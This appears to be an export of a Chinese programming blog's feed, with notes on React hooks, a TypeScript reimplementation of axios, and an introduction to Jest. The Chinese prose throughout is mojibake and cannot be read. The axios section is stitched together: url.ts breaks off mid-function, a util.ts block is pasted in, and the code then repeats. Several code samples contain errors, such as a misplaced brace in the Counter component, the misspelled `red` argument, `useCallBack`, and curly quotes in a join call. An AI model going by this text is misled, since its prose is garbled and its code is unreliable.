è€Œä¸æ˜¯å›žè°ƒå‡½æ•°ã€‚ reducer é‡å†™ useState çš„è®¡æ•°å™¨ 12345678910111213141516171819202122const initialState = &#123;count:0&#125;function reducer(state,action)&#123; switch(action.type)&#123; case 'increment': return &#123;count:state.count+1&#125;; case 'decrement': return &#123;count:state.count-1&#125;; default: throw new Error(); &#125;&#125;function Counter()&#123; const [state,dispatch] = useReducer(reducer,initialState) return( &lt;&gt; Count:&#123;state.count&#125; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'increment'&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'decrement'&#125;)&#125;&gt;-&lt;/button&gt; &lt;/&gt; )&#125; æŒ‡å®šåˆå§‹state æœ‰ä¸¤ç§åˆå§‹åŒ– useReducer state çš„æ–¹å¼ï¼Œå¯ä»¥æ ¹æ®ä½¿ç”¨åœºæ™¯é€‰æ‹©å…¶ä¸­çš„ä¸€ç§ã€‚å°†åˆå§‹ state ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ useReducer æ˜¯æœ€ç®€å•çš„æ–¹æ³•ï¼š 1234const [state,dispatch] = useReducer( reducer, &#123;count:initialCount&#125;) æƒ°æ€§åˆå§‹åŒ– é€‰æ‹©æƒ°æ€§åœ°åˆ›å»ºåˆå§‹åŒ– state,ä¸ºæ­¤éœ€è¦å°† init å‡½æ•°ä½œä¸º useReducer çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥ï¼Œè¿™æ ·åˆå§‹ state å°†è¢«è®¾ç½®ä¸º init(initialArg) è¿™æ ·åšï¼Œå¯ä»¥å°†ç”¨äºŽè®¡ç®— state çš„é€»è¾‘æå–åˆ° reducer å¤–éƒ¨ï¼Œè¿™ä¹Ÿä¸ºå°†æ¥å¯¹é‡ç½® state çš„ action åšå¤„ç†æä¾›äº†ä¾¿åˆ©ï¼š 123456789101112131415161718192021222324252627function init(initialCount)&#123; return &#123;count:initialCount&#125;&#125;function reducer(state,action)&#123; switch(action.type)&#123; case 'increment': return &#123;count:state.count+1&#125;; case 'decrement': return &#123;count:state.count-1&#125;; case 'reset': return init(action.payload); default: throw new Error(); &#125;&#125;function Counter(&#123;initialCount&#125;)&#123; const [state,dispatch] = useReducer(reducer,initialCount,init)&#125;return( &lt;&gt; Count:&#123;state.count&#125; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'reset',payload:initialCount&#125;)&#125;&gt;&lt;/button&gt; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'increment'&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'decrement'&#125;)&#125;&gt;-&lt;/button&gt; &lt;/&gt;) è·³è¿‡ dispatch å¦‚æžœ Reducer Hook çš„è¿”å›žå€¼ä¸Žå½“å‰ state ç›¸åŒï¼ŒReact å°†è·³è¿‡å­ç»„ä»¶çš„æ¸²æŸ“ä»¥åŠå‰¯ä½œç”¨çš„æ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒReact å¯èƒ½ä»éœ€è¦è·³è¿‡æ¸²æŸ“å‰å†æ¬¡æ¸²æŸ“è¯¥ç»„ä»¶ã€‚ä¸è¿‡ç”±äºŽReact ä¸ä¼šå¯¹ç»„ä»¶æ ‘çš„æ·±å±‚èŠ‚ç‚¹è¿›è¡Œä¸å¿…è¦çš„æ¸²æŸ“ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒã€‚å¦‚æžœåœ¨æ¸²æŸ“æœŸé—´æ‰§è¡Œäº†é«˜å¼€é”€çš„è®¡ç®—ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ useMemoæ¥è¿›è¡Œä¼˜åŒ– useCallback123456const memoziedCallback = useCallBack( ()=&gt;&#123; dosomething(a,b); &#125;, [a,b]) è¿”å›žä¸€ä¸ª memoized å›žè°ƒå‡½æ•° æŠŠå†…è”å›žè°ƒå‡½æ•°ä»¥åŠä¾èµ–æ•°ç»„ä½œä¸ºå‚æ•°ä¼ å…¥ useCallback ï¼Œå®ƒå°†è¿”å›žè¯¥å›žè°ƒå‡½æ•°çš„ memoized ç‰ˆæœ¬ï¼Œè¯¥å›žè°ƒå‡½æ•°ä»…åœ¨æŸä¸ªä¾èµ–é¡¹æ”¹å˜æ—¶æ‰ä¼šè·Ÿæ–°ã€‚å½“ä½ æŠŠå›žè°ƒå‡½æ•°ç»™ç»è¿‡ä¼˜åŒ–çš„å¹¶ä½¿ç”¨å¼•ç”¨ç›¸ç­‰æ€§åŽ»é¿å…éžå¿…è¦æ¸²æŸ“ï¼ˆä¾‹å¦‚ shouldComponentUpdateï¼‰çš„å­ç»„ä»¶ï¼Œå®ƒå°†éžå¸¸æœ‰ç”¨ useCallback(fn,deps)ç›¸å½“äºŽ useMemo(()=&gt;fn,deps) useMemo1const memoizedValue = useMemo(()=&gt;computeExpensiveValue(a,b),[a,b]) è¿”å›žä¸€ä¸ª memoizedå€¼ã€‚ æŠŠåˆ›å»ºå‡½æ•°å’Œä¾èµ–é¡¹ä½œä¸ºå‚æ•°ä¼ å…¥ useMemo,å®ƒä»…ä¼šåœ¨æŸä¸ªä¾èµ–é¡¹æ”¹å˜æ—¶æ‰é‡æ–°è®¡ç®— memoizedå€¼ï¼Œè¿™ç§ä¼˜åŒ–æœ‰åŠ©äºŽé¿å…åœ¨æ¯æ¬¡æ¸²æŸ“æ—¶éƒ½è¿›è¡Œé«˜å¼€é”€è®¡ç®—ã€‚ ä¼ å…¥ useMemo çš„å‡½æ•°ä¼šåœ¨æ¸²æŸ“æœŸé—´æ‰§è¡Œï¼Œä¸è¦åœ¨è¿™ä¸ªå‡½æ•°å†…éƒ¨æ‰§è¡ŒäºŽæ¸²æŸ“æ— å…³çš„æ“ä½œï¼Œè¯¸å¦‚å‰¯ä½œç”¨è¿™ç±»çš„æ“ä½œå±žäºŽ useEffect çš„é€‚ç”¨èŒƒç•´ï¼Œè€Œä¸æ˜¯ useMemo å¦‚æžœæ²¡æœ‰æä¾›ä¾èµ–é¡¹æ•°ç»„ï¼ŒuseMemo åœ¨æ¯æ¬¡æ¸²æŸ“æ—¶éƒ½ä¼šè®¡ç®—æ–°çš„å€¼ useRef1const refContainer = useRef(initialValue) useRef è¿”å›žä¸€ä¸ªå¯å˜çš„ ref å¯¹è±¡ï¼Œå…¶ .currentå±žæ€§è¢«åˆå§‹åŒ–ä¸ºä¼ å…¥çš„å‚æ•° initialValue ã€‚è¿”å›žçš„ ref å¯¹è±¡åœ¨ç»„ä»¶çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…ä¿æŒä¸å˜ã€‚ å‘½ä»¤å¼è®¿é—®å­ç»„ä»¶ï¼š 12345678910111213function TextInputWithFocusButton()&#123; const inputEl = useRef(null) const onButtonClick = ()=&gt;&#123; // current æŒ‡å‘å·²ç»æŒ‚è½½åˆ° DOM ä¸Šçš„æ–‡æœ¬è¾“å…¥å…ƒç´  inputEl.current.focus(); &#125; return( &lt;&gt; &lt;input ref=&#123;inputEl&#125; type="text"/&gt; &lt;button onClick=&#123;onButtonClick&#125;&gt;Focus the input&lt;/button&gt; &lt;/&gt; )&#125; useImperativeHandle1useImperativeHandle(ref,createHandle,[deps]) useImperativeHandleå¯ä»¥è®©ä½ åœ¨ä½¿ç”¨ refæ—¶è‡ªå®šä¹‰æš´éœ²ç»™çˆ¶ç»„ä»¶çš„å®žä¾‹å€¼ã€‚useImperativeHandleåº”å½“ä¸Ž forwardRefä¸€èµ·ä½¿ç”¨ï¼š 1234567891011function FancyInput(props,ref)&#123; const inputRef = useRef(); useImperativeHandle(red,()=&gt;&#123; focus:()=&gt;&#123; inputRef.current.focus() &#125; &#125;) return &lt;input ref=&#123;inputRef&#125; .../&gt;&#125;FancyInput = forwardRef(FancyInput)// æ¸²æŸ“ &lt;FancyInput ref=&#123;fancyInputRef&#125; /&gt; çš„çˆ¶ç»„ä»¶å¯ä»¥è°ƒç”¨ fancyInputRef.current.focus(); useLayoutEffectå…¶å‡½æ•°ç­¾åä¸Ž useEffect ç›¸åŒï¼Œä½†å®ƒä¼šåœ¨æ‰€æœ‰çš„DOM å˜æ›´ä¹‹åŽåŒæ­¥è°ƒç”¨ effectã€‚å¯ä»¥ä½¿ç”¨å®ƒæ¥è¯»å– DOM å¸ƒå±€å¹¶åŒæ­¥è§¦å‘é‡æ¸²æŸ“ã€‚åœ¨æµè§ˆå™¨æ‰§è¡Œç»˜åˆ¶ä¹‹å‰ï¼ŒuseLayoutEffect å†…éƒ¨çš„æ›´æ–°è®¡åˆ’ä¼šè¢«åŒæ­¥åˆ·æ–°ã€‚å°½å¯èƒ½ä½¿ç”¨ æ ‡å‡†çš„ useEffect ä»¥é¿å…é˜»å¡žè§†è§‰æ›´æ–° æ³¨æ„ï¼š useLayoutEffect ä¸Ž componentDidMountã€componentDIdUpdateçš„è°ƒç”¨é˜¶æ®µæ˜¯ä¸€æ ·çš„ã€‚ å¦‚æžœä½¿ç”¨æœåŠ¡ç«¯æ¸²æŸ“ï¼Œæ— è®ºæ˜¯ useLayoutEffect æˆ–è€… useEffect éƒ½æ— æ³•åœ¨ JS ä»£ç åŠ è½½å®Œæˆä¹‹å‰æ‰§è¡Œã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨æœåŠ¡ç«¯æ¸²æŸ“ç»„ä»¶ä¸­å¼•å…¥ useLayoutEffect ä»£ç ä¼šè§¦å‘React è­¦å‘Šã€‚è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦å°†ä»£ç é€»è¾‘ç§»åˆ° useEffect ä¸­ï¼ˆå¦‚æžœé¦–æ¬¡æ¸²æŸ“ä¸éœ€è¦è¿™æ®µé€»è¾‘çš„æƒ…å†µä¸‹ï¼‰ï¼Œæˆ–æ˜¯å°†è¯¥ç»„ä»¶å»¶è¿Ÿåˆ°å®¢æˆ·ç«¯æ¸²æŸ“å®ŒæˆåŽå†æ˜¾ç¤ºï¼ˆç›´åˆ° useLayoutEffectæ‰§è¡Œä¹‹å‰HTML éƒ½æ˜¾ç¤ºé”™è¯¯çš„æƒ…å†µä¸‹ï¼‰ è‹¥è¦ä»ŽæœåŠ¡ç«¯æ¸²æŸ“çš„ HTML ä¸­æŽ’é™¤ä¾èµ–å¸ƒå±€ effect çš„ç»„ä»¶ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ showChild &amp;&amp; &lt;Child&gt;è¿›è¡Œæ¡ä»¶æ¸²æŸ“ï¼Œå¹¶ä½¿ç”¨ useEffect(()=&gt;{setShowChild(true)},[])å»¶è¿Ÿå±•ç¤ºç»„ä»¶ã€‚è¿™æ ·åœ¨å®¢æˆ·å•æ¸²æŸ“å®Œæˆä¹‹å‰ï¼ŒUIå°±ä¸ä¼šåƒä¹‹å‰é‚£æ ·æ˜¾ç¤ºé”™ä¹±äº†ã€‚ useDebugValue1useDebugValue(value) useDebugValueå¯ç”¨äºŽ React å¼€å‘å·¥å…·ä¸­æ˜¾ç¤ºè‡ªå®šä¹‰ hook æ ‡ç­¾ 12345function useFriendStatus(friendID)&#123; const [isOnline,setIsOnline] = useState(null) useDebugValue(isOnline?'Online':'Offline') return isOnline&#125; å»¶è¿Ÿæ ¼å¼åŒ– debugå€¼ æŸäº›æƒ…å†µä¸‹ï¼Œæ ¼å¼åŒ–å€¼çš„æ˜¾ç¤ºå¯èƒ½æ˜¯ä¸€é¡¹å¼€é”€å¾ˆå¤§çš„æ“ä½œï¼Œé™¤éžæ£€æŸ¥ Hookï¼Œå¦åˆ™æ²¡æœ‰å¿…è¦è¿™ä¹ˆåšã€‚å› æ­¤ï¼ŒuseDebugValue æŽ¥å—ä¸€ä¸ªæ ¼å¼åŒ–å‡½æ•°ä½œä¸ºå¯é€‰çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚è¯¥å‡½æ•°åªæœ‰åœ¨ hook æ£€æŸ¥æ‰ä¼šè¢«è°ƒç”¨ã€‚å®ƒæŽ¥å— debug å€¼ä½œä¸ºå‚æ•°ï¼Œå¹¶ä¸”ä¼šè¿”å›žä¸€ä¸ªæ ¼å¼åŒ–çš„æ˜¾ç¤ºå€¼ã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸ªè¿”å›ž Date å€¼çš„è‡ªå®šä¹‰ Hook å¯ä»¥é€šè¿‡æ ¼å¼åŒ–å‡½æ•°æ¥é¿å…ä¸å¿…è¦çš„ toDateString å‡½æ•°è°ƒç”¨ 1useDebugValue(date,date=&gt;date.toDateString())]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŸºäºŽtsé‡æž„axios]]></title>
    <url>%2F2019-09-03-%E5%9F%BA%E4%BA%8Ets%E9%87%8D%E6%9E%84axios.html</url>
    <content type="text"><![CDATA[åŸºäºŽtsé‡æž„axiosustbhuangyi è€å¸ˆçš„ åŸºäºŽTypeScriptä»Žé›¶é‡æž„axioså­¦ä¹ è®°å½•ã€‚ çŸ¥è¯†ç‚¹ TypeScript å¸¸ç”¨è¯­æ³•ï¼š åŸºç¡€ç±»åž‹ ã€ å‡½æ•° ã€ å˜é‡å£°æ˜Ž ã€ æŽ¥å£ ã€ ç±» ã€ æ³›åž‹ ã€ ç±»åž‹æŽ¨æ–° ã€ é«˜çº§ç±»åž‹ axios jsåº“ï¼š é¡¹ç›®è„šæ‰‹æž¶ ã€ åŸºç¡€åŠŸèƒ½å®žçŽ° ã€ å¼‚å¸¸æƒ…å†µå¤„ç† ã€ æŽ¥å£æ‰©å±• ã€ æ‹¦æˆªå™¨å®žçŽ° ã€ é…ç½®åŒ–å®žçŽ° ã€ å–æ¶ˆåŠŸèƒ½å®žçŽ° ã€ å…¶ä»–åŠŸèƒ½å®žçŽ°ç­‰ç­‰ ä¸»è¦å·¥å…·ï¼šJest ã€ TSLint ã€ Commitizen ã€ Prettier ã€ RollupJS ã€ Semantic release åŸºæœ¬è¯­æ³•ç‚¹æˆ‘ éœ€æ±‚åˆ†æžFeatures åœ¨æµè§ˆå™¨ä½¿ç”¨ XMLHttpRequest å¯¹è±¡é€šè®¯ æ”¯æŒ Promise API æ”¯æŒè¯·æ±‚å’Œå“åº”çš„æ‹¦æˆªå™¨ æ”¯æŒè¯·æ±‚æ•°æ®å’Œå“åº”æ•°æ®çš„è½¬æ¢ æ”¯æŒè¯·æ±‚çš„å–æ¶ˆ JSONæ•°æ®çš„è‡ªåŠ¨è½¬æ¢ å®¢æˆ·ç«¯é˜²æ­¢ XSRF åŸºäºŽ XMLHttpRequest ç¼–å†™åŸºæœ¬è¯·æ±‚ä»£ç å¤„ç†è¯·æ±‚æ•°æ®ï¼šurl/body/headerssrc/types/index.ts 12345678export type Method = &apos;get&apos; | &apos;GET&apos; | &apos;delete&apos; | &apos;Delete&apos; | &apos;head&apos; | &apos;HEAD&apos; | &apos;options&apos; | &apos;OPTIONS&apos; | &apos;post&apos; | &apos;POST&apos; | &apos;put&apos; | &apos;PUT&apos; | &apos;patch&apos; | &apos;PATCH&apos;export interface AxiosRequestConfig &#123; url: string method?: Method data?: any params?: any headers?: any&#125; src/xhr.ts 12345678910111213141516import &#123; AxiosRequestConfig &#125; from &apos;./types&apos;export default function xhr(config: AxiosRequestConfig): void &#123; const &#123; data = null, url, method = &apos;get&apos;, headers &#125; = config const request = new XMLHttpRequest() // method,url,async request.open(method.toUpperCase(), url, true) Object.keys(headers).forEach(name =&gt; &#123; if (data === null &amp;&amp; name.toLowerCase() === &apos;content-type&apos;) &#123; delete headers[name] &#125; else &#123; request.setRequestHeader(name, headers[name]) &#125; &#125;) request.send(data)&#125; src/index.ts 1234567891011121314151617181920212223242526272829303132import &#123; AxiosRequestConfig &#125; from &apos;./types&apos;import &#123; buildURL &#125; from &apos;./helpers/url&apos;;import &#123; transformRequest &#125; from &apos;./helpers/data&apos;;import xhr from &apos;./xhr&apos;import &#123; processHeaders &#125; from &apos;./helpers/header&apos;;function axios(config: AxiosRequestConfig): void &#123; processConfig(config) xhr(config)&#125;function processConfig(config: AxiosRequestConfig): void &#123; config.url = transformURL(config) config.data = transformRequestData(config) config.headers = transformHeaders(config)&#125;function transformHeaders(config: AxiosRequestConfig): void &#123; const &#123; headers = &#123;&#125;, data &#125; = config return processHeaders(headers, data)&#125;function transformRequestData(config: AxiosRequestConfig): void &#123; return transformRequest(config.data)&#125;function transformURL(config: AxiosRequestConfig): string &#123; const &#123; url, params &#125; = config; return buildURL(url, params)&#125;export default axios å·¥å…·ç±»data.ts 12345678import &#123; isPlainObject &#125; from &quot;./util&quot;;export function transformRequest(data: any): any &#123; if (isPlainObject(data)) &#123; return JSON.stringify(data) &#125; return data&#125; headers.ts 1234567891011121314151617181920212223import &#123; isPlainObject &#125; from &quot;./util&quot;function normalizeHeaderName(headers: any, normalizedName: string): void &#123; if (!headers) &#123; return &#125; Object.keys(headers).forEach(name =&gt; &#123; if (name !== normalizedName &amp;&amp; name.toUpperCase() === normalizedName.toUpperCase()) &#123; headers[normalizedName] = headers[name] delete headers[name] &#125; &#125;)&#125;export function processHeaders(headers: any, data: any): any &#123; normalizeHeaderName(headers, &apos;Content-Type&apos;) if (isPlainObject(data)) &#123; if (headers &amp;&amp; !headers[&apos;Content-Type&apos;]) &#123; headers[&apos;Content-Type&apos;] = &apos;application/json;charset=utf-8&apos; &#125; &#125; return headers&#125; url.ts 123456789101112131415161718import &#123; isDate, isPlainObject &#125; from &apos;./util&apos;function encode(val: string): string &#123; return encodeURIComponent(val) .replace(/%40/g, &apos;@&apos;) .replace(/%3A/ig, &apos;:&apos;) .replace(/%24/g, &apos;**util.ts**â€‹```tsxconst toString = Object.prototype.toStringexport function isDate(val: any): val is Date &#123; return toString.call(val) === &apos;[object Date]&apos;&#125;export function isPlainObject(val: any): val is Object &#123; return toString.call(val) === &apos;[object Object]&apos;&#125; å¤„ç†å“åº”æ•°æ®å®šä¹‰å“åº”æŽ¥å£ types/index 1234567891011export interface AxiosResponse &#123; data: any status: number statusText: string headers: any config: AxiosRequestConfig request: any&#125;export interface AxiosPromise extends Promise&lt;AxiosResponse&gt; &#123;&#125; å¤„ç† headers çš„æ•°æ® helpers/header.ts 12345678910111213141516171819202122232425262728export function processHeaders(headers: any, data: any): any &#123; normalizeHeaderName(headers, &apos;Content-Type&apos;) if (isPlainObject(data)) &#123; if (headers &amp;&amp; !headers[&apos;Content-Type&apos;]) &#123; headers[&apos;Content-Type&apos;] = &apos;application/json;charset=utf-8&apos; &#125; &#125; return headers&#125;export function parseHeaders(headers: string): any &#123; let parsed = Object.create(null) if (!headers) &#123; return headers &#125; headers.split(&apos;\r\n&apos;).forEach(line =&gt; &#123; let [key, val] = line.split(&apos;:&apos;) key = key.trim().toLowerCase() if (!key) &#123; return &#125; if (val) &#123; val = val.trim(); &#125; parsed[key] = val &#125;) return parsed&#125; å¤„ç† å“åº”data helpers/data.ts 12345678910export function transformResponse(data: any): any &#123; if (typeof data === &apos;string&apos;) &#123; try &#123; data = JSON.parse(data) &#125; catch (e) &#123; // do nothing &#125; &#125; return data&#125; ä¿®æ”¹ xhr, è¿”å›žä¸€ä¸ª Promise xhr.ts 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; AxiosRequestConfig, AxiosPromise, AxiosResponse &#125; from &apos;./types&apos;import &#123; parseHeaders &#125; from &apos;./helpers/headers&apos;export default function xhr(config: AxiosRequestConfig): AxiosPromise &#123; return new Promise(resolve =&gt; &#123; const &#123; data = null, url, method = &apos;get&apos;, headers, responseType &#125; = config const request = new XMLHttpRequest() if (responseType) &#123; request.responseType = responseType &#125; // method,url,async request.open(method.toUpperCase(), url, true) request.onreadystatechange = function handleLoad() &#123; if (request.readyState !== 4) &#123; return &#125; const responseHeaders = parseHeaders(request.getAllResponseHeaders()) const responseData = responseType &amp;&amp; responseType !== &apos;text&apos; ? request.response : request.responseText const response: AxiosResponse = &#123; data: responseData, status: request.status, statusText: request.statusText, headers: responseHeaders, config, request &#125; resolve(response) &#125; Object.keys(headers).forEach(name =&gt; &#123; if (data === null &amp;&amp; name.toLowerCase() === &apos;content-type&apos;) &#123; delete headers[name] &#125; else &#123; request.setRequestHeader(name, headers[name]) &#125; &#125;) request.send(data) &#125;)&#125; å…·ä½“ä»£ç åœ°å€ ) .replace(/%2C/ig, &apos;,&apos;) .replace(/%20/g, &apos;+&apos;) .replace(/%5B/ig, &apos;[&apos;) .replace(/%5D/ig, &apos;]&apos;) } export function buildURL(url: string, params?: any): string { if (!params) { return url } const parts: string[] = [] Object.keys(params).forEach(key =&gt; { const val = params[key] if (val === null || typeof val === &apos;undefined&apos;) { return } let values = [] if (Array.isArray(val)) { values = val key += &apos;[]&apos; } else { values = [val] } values.forEach(val =&gt; { if (isDate(val)) { val = val.toISOString() } else if (isPlainObject(val)) { val = JSON.stringify(val) } parts.push( `${encode(key)}=${encode(val)}` ) }) }) let serializedParams = parts.join(â€˜&amp;â€™) if (serializedParams) { const markIndex = url.indexOf(&apos;#&apos;) if (markIndex !== -1) { url = url.slice(0, markIndex) } url += (url.indexOf(&apos;?&apos;) === -1 ? &apos;?&apos; : &apos;&amp;&apos;) + serializedParams } return url} 12345678910111213**util.ts**â€‹```tsxconst toString = Object.prototype.toStringexport function isDate(val: any): val is Date &#123; return toString.call(val) === &apos;[object Date]&apos;&#125;export function isPlainObject(val: any): val is Object &#123; return toString.call(val) === &apos;[object Object]&apos;&#125; å¤„ç†å“åº”æ•°æ®å®šä¹‰å“åº”æŽ¥å£ types/index 1234567891011export interface AxiosResponse &#123; data: any status: number statusText: string headers: any config: AxiosRequestConfig request: any&#125;export interface AxiosPromise extends Promise&lt;AxiosResponse&gt; &#123;&#125; å¤„ç† headers çš„æ•°æ® helpers/header.ts 12345678910111213141516171819202122232425262728export function processHeaders(headers: any, data: any): any &#123; normalizeHeaderName(headers, &apos;Content-Type&apos;) if (isPlainObject(data)) &#123; if (headers &amp;&amp; !headers[&apos;Content-Type&apos;]) &#123; headers[&apos;Content-Type&apos;] = &apos;application/json;charset=utf-8&apos; &#125; &#125; return headers&#125;export function parseHeaders(headers: string): any &#123; let parsed = Object.create(null) if (!headers) &#123; return headers &#125; headers.split(&apos;\r\n&apos;).forEach(line =&gt; &#123; let [key, val] = line.split(&apos;:&apos;) key = key.trim().toLowerCase() if (!key) &#123; return &#125; if (val) &#123; val = val.trim(); &#125; parsed[key] = val &#125;) return parsed&#125; å¤„ç† å“åº”data helpers/data.ts 12345678910export function transformResponse(data: any): any &#123; if (typeof data === &apos;string&apos;) &#123; try &#123; data = JSON.parse(data) &#125; catch (e) &#123; // do nothing &#125; &#125; return data&#125; ä¿®æ”¹ xhr, è¿”å›žä¸€ä¸ª Promise xhr.ts 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; AxiosRequestConfig, AxiosPromise, AxiosResponse &#125; from &apos;./types&apos;import &#123; parseHeaders &#125; from &apos;./helpers/headers&apos;export default function xhr(config: AxiosRequestConfig): AxiosPromise &#123; return new Promise(resolve =&gt; &#123; const &#123; data = null, url, method = &apos;get&apos;, headers, responseType &#125; = config const request = new XMLHttpRequest() if (responseType) &#123; request.responseType = responseType &#125; // method,url,async request.open(method.toUpperCase(), url, true) request.onreadystatechange = function handleLoad() &#123; if (request.readyState !== 4) &#123; return &#125; const responseHeaders = parseHeaders(request.getAllResponseHeaders()) const responseData = responseType &amp;&amp; responseType !== &apos;text&apos; ? request.response : request.responseText const response: AxiosResponse = &#123; data: responseData, status: request.status, statusText: request.statusText, headers: responseHeaders, config, request &#125; resolve(response) &#125; Object.keys(headers).forEach(name =&gt; &#123; if (data === null &amp;&amp; name.toLowerCase() === &apos;content-type&apos;) &#123; delete headers[name] &#125; else &#123; request.setRequestHeader(name, headers[name]) &#125; &#125;) request.send(data) &#125;)&#125; å…·ä½“ä»£ç åœ°å€]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å¿…å¤‡çš„æµ‹è¯•]]></title>
    <url>%2F2019-08-19-%E5%89%8D%E7%AB%AF%E5%BF%85%E5%A4%87%E7%9A%84%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[å‰ç«¯å¿…å¤‡çš„æµ‹è¯•DellLee è€å¸ˆçš„ å‰ç«¯è¦å­¦çš„æµ‹è¯•è¯¾ ä»ŽJestå…¥é—¨åˆ°TDD/BDDåŒå®žæˆ˜å­¦ä¹ è®°å½•ã€‚ çŸ¥è¯†ç‚¹ Jest åŸºç¡€ åŸºç¡€APIã€å¼‚æ­¥æµ‹è¯•ã€MockæŠ€å·§ã€å¿«ç…§ã€timeræµ‹è¯•ã€Domæµ‹è¯• å®žçŽ°é¡¹ç›® Vueã€Vue-test-utilsã€Reactã€Enzymeã€TDD+å•å…ƒæµ‹è¯•ã€BDD+é›†æˆæµ‹è¯• åˆè¯†æµ‹è¯•1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// math.jsfunction add(a, b) &#123; return a + b;&#125;function minus(a, b) &#123; return a - b&#125;export &#123; add, minus&#125;// math.test.js// ç®€é™‹æµ‹è¯•import &#123; add, minus &#125; from './math'let resultlet expectedresult = add(3, 7)expected = 10;if (result !== 10) &#123; throw Error(`3 + 7 åº”è¯¥ç­‰äºŽ $&#123;expected&#125;,ä½†ç»“æžœå´æ˜¯ $&#123;result&#125;`)&#125;result = minus(3, 3)expected = 0;if (result !== 0) &#123; throw Error(`3 - 3 åº”è¯¥ç­‰äºŽ $&#123;expected&#125;,ä½†ç»“æžœå´æ˜¯ $&#123;result&#125;`)&#125;// å°è£…ç‰ˆimport &#123; add, minus &#125; from './math'function expect(result) &#123; return &#123; toBe: function (actual) &#123; if (result !== actual) &#123; throw new Error(`é¢„æœŸå€¼ä¸Žå®žé™…å€¼ä¸ç›¸ç­‰ é¢„æœŸ$&#123;actual&#125; ç»“æžœå´æ˜¯ $&#123;result&#125;`) &#125; &#125; &#125;&#125;function test(desc, fn) &#123; try &#123; fn(); console.log(`$&#123;desc&#125;é€šè¿‡æµ‹è¯•`) &#125; catch (e) &#123; console.log(`$&#123;desc&#125;æ²¡æœ‰é€šè¿‡æµ‹è¯• $&#123;e&#125;`) &#125;&#125;test('æµ‹è¯•åŠ æ³•3 + 7', () =&gt; &#123; expect(add(3, 7)).toBe(6)&#125;)test('æµ‹è¯•å‡æ³•6 - 3', () =&gt; &#123; expect(minus(6, 3)).toBe(6)&#125;) è‡ªåŠ¨åŒ–æ¡†æž¶ï¼šJestä¼˜ç‚¹ï¼šæ€§èƒ½ã€åŠŸèƒ½ã€æ˜“ç”¨æ€§ã€é€Ÿåº¦å¿«ã€Apiç®€å•ã€æ˜“é…ç½®ã€éš”ç¦»æ€§å¥½ã€ç›‘æŽ§æ¨¡å¼ã€IDEæ•´åˆã€Snapshotã€å¤šé¡¹ç›®å¹¶è¡Œã€è¦†ç›–çŽ‡ã€Mockä¸°å¯Œ ç®€å•é…ç½®123456# é¡¹ç›®å†…éƒ¨è°ƒç”¨ jestnpx jest --init # é€‰æ‹© browser-like# éšåŽé€‰æ‹©è‡ªåŠ¨ç”ŸæˆæŠ¥å‘Šï¼Œè‡ªåŠ¨æ¸…é™¤å®žä¾‹åœ¨æ¯ä¸ªtestä¹‹å‰ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸‹é…ç½®æ–‡ä»¶jest.config.js jest.config.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205// For a detailed explanation regarding each configuration property, visit:// https://jestjs.io/docs/en/configuration.htmlmodule.exports = &#123; // All imported modules in your tests should be mocked automatically // è‡ªåŠ¨æ¨¡æ‹Ÿåœ¨æµ‹è¯•ç”¨ä¾‹ä¸­çš„æ‰€æœ‰å¯¼å…¥æ¨¡å—ï¼Œåœ¨ __mocks__ æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾ // automock: false, // Stop running tests after `n` failures // é»˜è®¤æƒ…å†µä¸‹ï¼ŒJestè¿è¡Œæ‰€æœ‰æµ‹è¯•å¹¶åœ¨å®ŒæˆåŽå°†æ‰€æœ‰é”™è¯¯ç”Ÿæˆåˆ°æŽ§åˆ¶å°ï¼Œbil è®© jest åœ¨ n å¤±è´¥åŽåœæ­¢è¿è¡Œæµ‹è¯• // bail: 0, // Respect "browser" field in package.json when resolving modules // false =&gt; browser | true =&gt; node // browser: false, // The directory where Jest should store its cached dependency information // å­˜æ”¾ jest ä¾èµ–ä¿¡æ¯ç¼“å­˜çš„ç›®å½• // cacheDirectory: "C:\\Users\\Administrator\\AppData\\Local\\Temp\\jest", // Automatically clear mock calls and instances between every test // è‡ªåŠ¨æ¸…é™¤æ¨¡æ‹Ÿè°ƒç”¨å’Œå®žä¾‹åœ¨æ¯æ¬¡æµ‹è¯•ä¹‹é—´ clearMocks: true, // Indicates whether the coverage information should be collected while executing the test // æ˜¯å¦æ”¶é›†æµ‹è¯•æ—¶çš„è¦†ç›–çŽ‡ä¿¡æ¯ï¼Œå› 